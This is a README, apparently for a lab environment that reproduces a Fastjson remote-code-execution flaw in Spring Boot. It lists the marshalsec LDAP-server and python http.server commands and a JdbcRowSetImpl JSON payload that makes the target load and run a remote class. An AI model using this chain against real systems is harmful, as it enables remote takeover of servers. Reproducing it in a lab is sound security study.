# fastjson-rce
![](https://img.shields.io/badge/language-java-yellow)
![](https://img.shields.io/github/stars/dbgee/fastjson-rce)
![](https://img.shields.io/github/workflow/status/dbgee/fastjson-rce/Maven%20Package)

fastjson rce env based on springboot

## 环境说明
* Exploit.java  编译好的class 文件文件和利用工具在Exploit 目录下

* 利用工具也可以自行下载编译
  ```shell script
    git clone https://github.com/mbechler/marshalsec.git [克隆项目到本地]
    mvn clean package -DskipTests  [这条命令执行完之后会在target 目录生成我们需要的可执行文件：marshalsec-0.0.3-SNAPSHOT-all.jar]
  ```

## 使用步骤
* java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/#Exploit 10086 
* python -m http.server 8081
* 发送利用payload：{"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "ldap://127.0.0.1:10086/Object","autoCommit": true}

## update info
通过H2 数据库，对数据做了持久化处理，可以保存提交的数据到服务端

## 参考文章
* https://mp.weixin.qq.com/s?__biz=MzIyNDcwODgwMA==&mid=2247484165&idx=1&sn=7777807338909931f887108d647d0c32&chksm=e80b92aadf7c1bbc32fb273fe7e18bb4baaccc416d0c1dd7accf31091d4d89fddcb7bd140d2e&token=2026528112&lang=zh_CN#rd